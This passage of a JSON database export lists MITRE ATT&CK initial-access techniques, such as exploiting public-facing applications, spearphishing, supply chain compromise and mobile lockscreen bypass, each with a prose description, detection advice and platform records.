the drive-by exploit from a legitimate website may be difficult. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of browser processes. This could include suspicious files written to disk, evidence of [Process Injection](https:\/\/attack.mitre.org\/techniques\/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":225,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":225,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":225,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":225,"platform_id":9,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":239,"name":"T1190 - Exploit Public-Facing Application","sort_id":0,"external_id":"T1190","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL)(Citation: NVD CVE-2016-6662), standard services (like SMB(Citation: CIS Multiple SMB Vulnerabilities) or SSH), and any other applications with Internet accessible open sockets, such as web servers and related services.(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include <a href=\"https:\/\/attack.mitre.org\/techniques\/T1211\">Exploitation for Defense Evasion<\/a>.<\/p>\n<p>If an application is hosted on cloud-based infrastructure, then exploiting it may lead to compromise of the underlying instance. This can allow an adversary a path to access the cloud APIs or to take advantage of weak identity and access management policies.<\/p>\n<p>For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":239,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":239,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":239,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":239,"platform_id":6,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":239,"platform_id":7,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":239,"platform_id":8,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":259,"name":"T1200 - Hardware Additions","sort_id":0,"external_id":"T1200","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Adversaries may introduce computer accessories, computers, or networking hardware into a system or network that can be used as a vector to gain access. While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access. Commercial and open source products are leveraged with capabilities such as passive network tapping (Citation: Ossmann Star Feb 2011), man-in-the middle encryption breaking (Citation: Aleks Weapons Nov 2015), keystroke injection (Citation: Hak5 RubberDuck Dec 2016), kernel memory reading via DMA (Citation: Frisk DMA August 2016), adding new wireless access to an existing network (Citation: McMillan Pwn March 2012), and others.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Asset management systems may help with the detection of computer systems or network devices that should not exist on a network. \n\nEndpoint sensors may be able to detect the addition of hardware via USB, Thunderbolt, and other external device communication ports.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":259,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":259,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":259,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":369,"name":"T1193 - Spearphishing Attachment","sort_id":0,"external_id":"T1193","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon <a href=\"https:\/\/attack.mitre.org\/techniques\/T1204\">User Execution<\/a> to gain execution.<\/p>\n<p>There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":369,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":369,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":369,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":370,"name":"T1192 - Spearphishing Link","sort_id":0,"external_id":"T1192","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. <\/p>\n<p>All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging <a href=\"https:\/\/attack.mitre.org\/techniques\/T1204\">User Execution<\/a>. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs\/web beacons). Links may also direct users to malicious applications  designed to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1528\">Steal Application Access Token<\/a>s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":370,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":370,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":370,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":370,"platform_id":4,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":370,"platform_id":9,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":371,"name":"T1194 - Spearphishing via Service","sort_id":0,"external_id":"T1194","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. <\/p>\n<p>All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.<\/p>\n<p>A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":371,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":371,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":371,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":381,"name":"T1195 - Supply Chain Compromise","sort_id":0,"external_id":"T1195","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.<\/p>\n<p>Supply chain compromise can take place at any stage of the supply chain including:<\/p>\n<ul>\n<li>Manipulation of development tools<\/li>\n<li>Manipulation of a development environment<\/li>\n<li>Manipulation of source code repositories (public or private)<\/li>\n<li>Manipulation of source code in open-source dependencies<\/li>\n<li>Manipulation of software update\/distribution mechanisms<\/li>\n<li>Compromised\/infected system images (multiple cases of removable media infected at the factory) (Citation: IBM Storwize) (Citation: Schneider Electric USB Malware) <\/li>\n<li>Replacement of legitimate software with modified versions<\/li>\n<li>Sales of modified\/counterfeit products to legitimate distributors<\/li>\n<li>Shipment interdiction<\/li>\n<\/ul>\n<p>While supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. (Citation: Avast CCleaner3 2018) (Citation: Microsoft Dofoil 2018) (Citation: Command Five SK 2011) Targeting may be specific to a desired victim set (Citation: Symantec Elderwood Sept 2012) or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. (Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency. (Citation: Trendmicro NPM Compromise)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. Perform physical inspection of hardware to look for potential tampering.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":381,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":381,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":381,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":400,"name":"T1199 - Trusted Relationship","sort_id":0,"external_id":"T1199","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.<\/p>\n<p>Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> used by the other party for access to internal network systems may be compromised and used.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Establish monitoring for activity conducted by second and third party providers and other trusted entities that may be leveraged as a means to gain access to the network. Depending on the type of relationship, an adversary may have access to significant amounts of information about the target before conducting an operation, especially if the trusted relationship is based on IT services. Adversaries may be able to act quickly towards an objective, so proper monitoring for behavior related to Credential Access, Lateral Movement, and Collection will be important to detect the intrusion.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":400,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":400,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":400,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":400,"platform_id":6,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":400,"platform_id":7,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":400,"platform_id":8,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":400,"platform_id":9,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":439,"name":"T1475 - Deliver Malicious App via Authorized App Store","sort_id":0,"external_id":"T1475","external_sub_id":null,"old_external_id":"MOB-T1078","old_external_sub_id":null,"tactic_id":24,"description":"<p>Malicious applications are a common attack vector used by adversaries to gain a presence on mobile devices. Mobile devices often are configured to allow application installation only from an authorized app store (e.g., Google Play Store or Apple App Store). An adversary may seek to place a malicious application in an authorized app store, enabling the application to be installed onto targeted devices.<\/p>\n<p>App stores typically require developer registration and use vetting techniques to identify malicious applications. Adversaries may use these techniques against app store defenses:<\/p>\n<ul>\n<li><a href=\"https:\/\/attack.mitre.org\/techniques\/T1407\">Download New Code at Runtime<\/a><\/li>\n<li><a href=\"https:\/\/attack.mitre.org\/techniques\/T1406\">Obfuscated Files or Information<\/a><\/li>\n<\/ul>\n<p>Adversaries may also seek to evade vetting by placing code in a malicious application to detect whether it is running in an app analysis environment and, if so, avoid performing malicious actions while under analysis. (Citation: Petsas) (Citation: Oberheide-Bouncer) (Citation: Percoco-Bouncer) (Citation: Wang)<\/p>\n<p>Adversaries may also use fake identities, payment cards, etc., to create developer accounts to publish malicious applications to app stores. (Citation: Oberheide-Bouncer)<\/p>\n<p>Adversaries may also use control of a target's Google account to use the Google Play Store's remote installation capability to install apps onto the Android devices associated with the Google account. (Citation: Oberheide-RemoteInstall) (Citation: Konoth) (Only applications that are available for download through the Google Play Store can be remotely installed using this technique.)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"* An EMM\/MDM or mobile threat defense solution can identify the presence of unwanted or known insecure or malicious apps on devices.\n* Developers can scan (or have a third party scan on their behalf) the app stores for presence of unauthorized apps that were submitted using the developer's identity.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":439,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":439,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":440,"name":"T1476 - Deliver Malicious App via Other Means","sort_id":0,"external_id":"T1476","external_sub_id":null,"old_external_id":"MOB-T1079","old_external_sub_id":null,"tactic_id":24,"description":"<p>Malicious applications are a common attack vector used by adversaries to gain a presence on mobile devices. This technique describes installing a malicious application on targeted mobile devices without involving an authorized app store (e.g., Google Play Store or Apple App Store). Adversaries may wish to avoid placing malicious applications in an authorized app store due to increased potential risk of detection or other reasons. However, mobile devices often are configured to allow application installation only from an authorized app store which would prevent this technique from working.<\/p>\n<p>Delivery methods for the malicious application include:<\/p>\n<ul>\n<li><a href=\"https:\/\/attack.mitre.org\/techniques\/T1193\">Spearphishing Attachment<\/a> - Including the mobile app package as an attachment to an email message.<\/li>\n<li><a href=\"https:\/\/attack.mitre.org\/techniques\/T1192\">Spearphishing Link<\/a> - Including a link to the mobile app package within an email, text message (e.g. SMS, iMessage, Hangouts, WhatsApp, etc.), web site, QR code, or other means.<\/li>\n<li>Third-Party App Store - Installed from a third-party app store (as opposed to an authorized app store that the device implicitly trusts as part of its default behavior), which may not apply the same level of scrutiny to apps as applied by an authorized app store.(Citation: IBTimes-ThirdParty)(Citation: TrendMicro-RootingMalware)(Citation: TrendMicro-FlappyBird)<\/li>\n<\/ul>\n<p>Some Android malware comes with functionality to install additional applications, either automatically or when the adversary instructs it to.(Citation: android-trojan-steals-paypal-2fa)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"* An EMM\/MDM or mobile threat defense solution may be able to identify the presence of apps installed from sources other than an authorized app store. \n* An EMM\/MDM or mobile threat defense solution may be able to identify Android devices configured to allow apps to be installed from \"Unknown Sources\".\n* Enterprise email security solutions can identify the presence of Android or iOS application packages within email messages.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":440,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":440,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":446,"name":"T1456 - Drive-by Compromise","sort_id":0,"external_id":"T1456","external_sub_id":null,"old_external_id":"MOB-T1059","old_external_sub_id":null,"tactic_id":24,"description":"<p>As described by <a href=\"https:\/\/attack.mitre.org\/techniques\/T1189\">Drive-by Compromise<\/a>, a drive-by compromise is when an adversary gains access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is targeted for exploitation. For example, a website may contain malicious media content intended to exploit vulnerabilities in media parsers as demonstrated by the Android Stagefright vulnerability  (Citation: Zimperium-Stagefright).<\/p>\n<p>(This technique was formerly known as Malicious Web Content. It has been renamed to better align with ATT&amp;CK for Enterprise.)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":446,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":446,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":454,"name":"T1458 - Exploit via Charging Station or PC","sort_id":0,"external_id":"T1458","external_sub_id":null,"old_external_id":"MOB-T1061","old_external_sub_id":null,"tactic_id":24,"description":"<p>If the mobile device is connected (typically via USB) to a charging station or a PC, for example to charge the device's battery, then a compromised or malicious charging station or PC could attempt to exploit the mobile device via the connection(Citation: Krebs-JuiceJacking).<\/p>\n<p>Previous demonstrations have included:<\/p>\n<ul>\n<li>Injecting malicious applications into iOS devices(Citation: Lau-Mactans).<\/li>\n<li>Exploiting a Nexus 6 or 6P device over USB and gaining the ability to perform actions including intercepting phone calls, intercepting network traffic, and obtaining the device physical location(Citation: IBM-NexusUSB).<\/li>\n<li>Exploiting Android devices such as the Google Pixel 2 over USB(Citation: GoogleProjectZero-OATmeal).<\/li>\n<\/ul>\n<p>Products from Cellebrite and Grayshift purportedly can use physical access to the data port to unlock the passcode on some iOS devices(Citation: Computerworld-iPhoneCracking).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":454,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":454,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":455,"name":"T1477 - Exploit via Radio Interfaces","sort_id":0,"external_id":"T1477","external_sub_id":null,"old_external_id":"MOB-T1080","old_external_sub_id":null,"tactic_id":24,"description":"<p>The mobile device may be targeted for exploitation through its interface to cellular networks or other radio interfaces.<\/p>\n<h3>Baseband Vulnerability Exploitation<\/h3>\n<p>A message sent over a radio interface (typically cellular, but potentially Bluetooth, GPS, NFC, Wi-Fi(Citation: ProjectZero-BroadcomWiFi) or other) to the mobile device could exploit a vulnerability in code running on the device(Citation: Register-BaseStation)(Citation: Weinmann-Baseband).<\/p>\n<h3>Malicious SMS Message<\/h3>\n<p>An SMS message could contain content designed to exploit vulnerabilities in the SMS parser on the receiving device(Citation: Forbes-iPhoneSMS). An SMS message could also contain a link to a web site containing malicious content designed to exploit the device web browser. Vulnerable SIM cards may be remotely exploited and reprogrammed via SMS messages(Citation: SRLabs-SIMCard).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":455,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":455,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":464,"name":"T1461 - Lockscreen Bypass","sort_id":0,"external_id":"T1461","external_sub_id":null,"old_external_id":"MOB-T1064","old_external_sub_id":null,"tactic_id":24,"description":"<p>An adversary with physical access to a mobile device may seek to bypass the device's lockscreen.<\/p>\n<h3>Biometric Spoofing<\/h3>\n<p>If biometric authentication is used, an adversary could attempt to spoof a mobile device's biometric authentication mechanism(Citation: SRLabs-Fingerprint)(Citation: SecureIDNews-Spoof)(Citation: TheSun-FaceID).<\/p>\n<p>iOS partly mitigates this attack by requiring the device passcode rather than a fingerprint to unlock the device after every device restart and after 48 hours since the device was last unlocked (Citation: Apple-TouchID). Android has similar mitigations.<\/p>\n<h3>Device Unlock Code Guessing or Brute Force<\/h3>\n<p>An adversary could attempt to brute-force or otherwise guess the lockscreen passcode (typically a PIN or password), including physically observing (&quot;shoulder surfing&quot;) the device owner's use of the lockscreen passcode. <\/p>\n<h3>Exploit Other Device Lockscreen Vulnerabilities<\/h3>\n<p>Techniques have periodically been demonstrated that exploit vulnerabilities on Android (Citation: Wired-AndroidBypass), iOS (Citation: Kaspersky-iOSBypass), or other mobile devices to bypass the device lockscreen. The vulnerabilities are generally patched by the device\/operating system vendor once they become aware of their existence.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":464,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":464,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":467,"name":"T1444 - Masquerade as Legitimate Application","sort_id":0,"external_id":"T1444","external_sub_id":null,"old_external_id":"MOB-T1047","old_external_sub_id":null,"tactic_id":24,"description":"<p>An adversary could distribute developed malware by masquerading the malware as a legitimate application. This can be done in two different ways: by embedding the malware in a legitimate application, or by pretending to be a legitimate application.<\/p>\n<p>Embedding the malware in a legitimate application is done by downloading the application, disassembling it, adding the malicious code, and then re-assembling it.(Citation: Zhou) The app would appear to be the original app, but would contain additional malicious functionality. The adversary could then publish the malicious application to app stores or use another delivery method.<\/p>\n<p>Pretending to be a legitimate application relies heavily on lack of scrutinization by the user. Typically, a malicious app pretending to be a legitimate one will have many similar details as the legitimate one, such as name, icon, and description.(Citation: Palo Alto HenBox)<\/p>\n<p>Malicious applications may also masquerade as legitimate applications when requesting access to the accessibility service in order to appear as legitimate to the user, increasing the likelihood that the access will be granted.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 